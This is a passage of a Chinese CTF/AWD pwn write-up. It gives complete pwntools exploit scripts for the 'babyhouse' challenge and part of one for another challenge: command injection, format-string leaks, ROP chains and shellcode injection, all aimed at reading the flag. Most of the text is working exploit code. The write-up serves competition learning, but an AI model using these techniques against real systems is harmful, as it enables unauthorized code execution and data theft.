    sd("a"*0x38+"/home/xctf/flag\x00")
    ru("Do you like the CalcName automatically generated by the system? [Y/N]")
    sl("N")
    ru("New CalcName: ")
    canary = 0x0000000000000001
    sl("/home/xctf/flag\x00"+"a"*0x18+p64(canary)+p64(1)+p64(p_rdi)+p64(puts_got)+p64(puts_plt)+p64(start))
    debug()
    for x in range(35):
        exp_sub(2,1,"Y")
    # debug()
    ru("CMD>> ")
    sl("5")
    libc_base = u64(r.recv(6)+"\x00\x00")-libc.symbols['puts']
    li("libc_base",libc_base)
    binsh = 0x000000000018ce17+libc_base
    system = libc_base+libc.symbols['system']
    #再次栈溢出进行读flag
    ru("CMD>> ")
    sl("2")
    ru("UserName: ")
    sd("a"*0x34+"cat /home/xctf/flag\x00")
    ru("Do you like the CalcName automatically generated by the system? [Y/N]")
    sl("N")
    ru("New CalcName: ")
    canary = 0x0000000000000001
    sl("/home/xctf/flag\x00"+"a"*0x18+p64(canary)+p64(1)+p64(p_rdi)+p64(flag_str)+p64(system))
    # debug()
    for x in range(35):
        exp_sub(2,1,"Y")
    # debug()
    ru("CMD>> ")
    sl("5")
    ri()
> 比赛时抓到其他队伍的攻击流量，是通过orw来进行读取flag。
## babyhouse
题目环境：ubuntu18:04
题目信息：
    radish ➜ pwn2  file babyhouse
    babyhouse: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9a83b6747a475098e28a86c818257ca9688437ec, stripped
    radish ➜ pwn2  checksec --file=./babyhouse
    [*] '/media/psf/Home/Desktop/pwn/pwn2/babyhouse'
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      PIE enabled
    radish ➜ pwn2
本道题目漏洞有点多。首先题目提供了5个功能，分别是`ls、cat、sh、zip、print`
###  漏洞一
在ls功能中，程序用`ls`来拼接输入的字符，代码如下图所示：
对于输入没有进行过滤，直接传入到system函数执行，导致可以执行任意命令
exp_1:
    from pwn import *
    # context.log_level='debug'
    file_name = './babyhouse'
    libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
    r = process(file_name)
    sl = lambda x : r.sendline(x)
    sd = lambda x : r.send(x)
    sla = lambda x,y : r.sendlineafter(x,y)
    rud = lambda x : r.recvuntil(x,drop=True)
    ru = lambda x : r.recvuntil(x)
    li = lambda name,x : log.info(name+':'+hex(x))
    ri = lambda  : r.interactive()
    ru("> ")
    sl("ls")
    ru("Dir: ")
    # debug()
    sl("/;cat /home/xctf/flag\x00")
    ri()
###  漏洞二
在`ls`功能中，输入命令的时候，输入长度过长导致栈溢出，因为程序开启了PIE，所以要配合`print`功能中的格式化字符串漏洞来泄露地址
exp_2:
    from pwn import *
    context.log_level='debug'
    file_name = './babyhouse'
    libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
    libc = ELF(libc_name)
    r = process(file_name)
    sl = lambda x : r.sendline(x)
    sd = lambda x : r.send(x)
    sla = lambda x,y : r.sendlineafter(x,y)
    rud = lambda x : r.recvuntil(x,drop=True)
    ru = lambda x : r.recvuntil(x)
    li = lambda name,x : log.info(name+':'+hex(x))
    ri = lambda  : r.interactive()
    def debug():
        gdb.attach(r)
        raw_input()
    ru(">")
    sl("print")
    ru("Content: ")
    sl("%21$p")
    libc_base =  eval(rud(">"))-0x21b97
    li("libc_base",libc_base)
    p_rdi = libc_base  + 0x000000000002155f# : pop rdi ; ret
    system = libc_base+libc.symbols['system']
    binsh = 0x00000000001b40fa+libc_base
    one_gg = 0x4f365 + libc_base
    li("system",system)
    li("binsh",binsh)
    # ru(">")
    sl("print")
    ru("Content: ")
    sl("%9$p")
    elf_base =  eval(rud(">"))-0x2262
    li("elf_base",elf_base)
    flag_addr = 0x205370 + elf_base
    p_rdi = libc_base + 0x000000000002155f# : pop rdi ; ret
    p_rsi = libc_base + 0x0000000000023e8a# : pop rsi ; ret
    p_rdx = libc_base + 0x0000000000001b96# : pop rdx ; ret
    open_addr = libc_base + libc.symbols['open']
    read_addr = libc_base + libc.symbols['read']
    write_addr = libc_base + libc.symbols['write']
    start_addr = elf_base + 0x01FC0
    payload = "/\x00"+"a"*(0xd+6)+p64(p_rdi)+p64(0)+p64(p_rsi)+p64(flag_addr)+p64(p_rdx)+p64(0x10)+p64(read_addr)+p64(start_addr)
    # debug()
    sl("ls")
    ru(" Dir: ")
    sl(payload)
    sd("/home/xctf/flag\x00")
    li("p_rdi",p_rdi)
    payload_2 = "/\x00"+"a"*(0xd+6)+p64(p_rdi)+p64(flag_addr)+p64(p_rdx)+p64(0)+p64(open_addr)+p64(start_addr)
    sl("ls")
    ru(" Dir: ")
    sl(payload_2)
    payload_3 = "/\x00"+"a"*(0xd+6)+p64(p_rdi)+p64(3)+p64(p_rsi)+p64(flag_addr)+p64(p_rdx)+p64(0x50)+p64(read_addr)+p64(start_addr)
    sl("ls")
    ru(" Dir: ")
    sl(payload_3)
    # debug()
    payload_4 = "/\x00"+"a"*(0xd+6)+p64(p_rdi)+p64(1)+p64(p_rsi)+p64(flag_addr)+p64(p_rdx)+p64(0x50)+p64(write_addr)+p64(start_addr)
    sl("ls")
    ru(" Dir: ")
    sl(payload_4)
    ri()
###  漏洞三
在`sh`功能中直接是将用户输入当做命令执行。
exp_3:
    from pwn import *
    context.log_level='debug'
    file_name = './babyhouse'
    libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
    libc = ELF(libc_name)
    r = process(file_name)
    sl = lambda x : r.sendline(x)
    sd = lambda x : r.send(x)
    sla = lambda x,y : r.sendlineafter(x,y)
    rud = lambda x : r.recvuntil(x,drop=True)
    ru = lambda x : r.recvuntil(x)
    li = lambda name,x : log.info(name+':'+hex(x))
    ri = lambda  : r.interactive()
    ru(">")
    sl("sh")
    ru("Command: ")
    sl("sh")
    sl("cat /home/xctf/flag\x00")
    ri()
###  漏洞四
`zip`功能中，如果我们输入的字符串的ascii码相加是”0xa”的倍数的话，程序就可以把我们的输入作为代码来执行，导致可以执行shellcode。
    from pwn import *
    context.log_level='debug'
    context.arch = 'amd64'
    file_name = './babyhouse'
    libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
    libc = ELF(libc_name)
    r = process(file_name)
    sl = lambda x : r.sendline(x)
    sd = lambda x : r.send(x)
    sla = lambda x,y : r.sendlineafter(x,y)
    rud = lambda x : r.recvuntil(x,drop=True)
    ru = lambda x : r.recvuntil(x)
    li = lambda name,x : log.info(name+':'+hex(x))
    ri = lambda  : r.interactive()
    def debug():
        gdb.attach(r)
        raw_input()
    ru(">")
    sl("zip")
    # debug()
    ru("Content to zip: ")
    shellcode = asm(shellcraft.sh())+"\x90\x90"+"\x05"
    sum = 0
    for x in range(len(shellcode)):
        sum += ord(shellcode[x])
    # print sum
    sl(shellcode)
    sl("cat /home/xctf/flag\x00")
    ri()
## 总结
1、本次提供靶机连接方式是通过`id_rsa`文件来登录靶机，`id_rsa、id_rsa.pub`文件的属性需要是`600`，连接命令：`ssh -i
./id_rsa [PI:EMAIL](mailto:PI:EMAIL).11`
2、在AWD中，Pwn流量审计也是很重要的。由于这次试用的是XCTF的平台，提供了Pwn的攻击流量，所以在比赛中自己也通过流量拿到过某个攻击链。然后把流量中的数据修改成脚本，直接开打。
3、Patch还是要谨慎的，不然会判宕机。一方面是要确定漏洞修复之后不能再利用此漏洞进行攻击，另一方面修复之后不影响程序其他功能和程序的正常运行。为了更好的避免被平台判宕机，可以通过流量找到check机器发出check程序是否正常的流量，根据这些数据来进行修补会好很多。
## 附件
[附件下载地址](https://github.com/wxm-radish/CTF-challenge-file/blob/main/%E9%B9%A4%E5%9F%8E%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9BPWN%E9%99%84%E4%BB%B6.zip)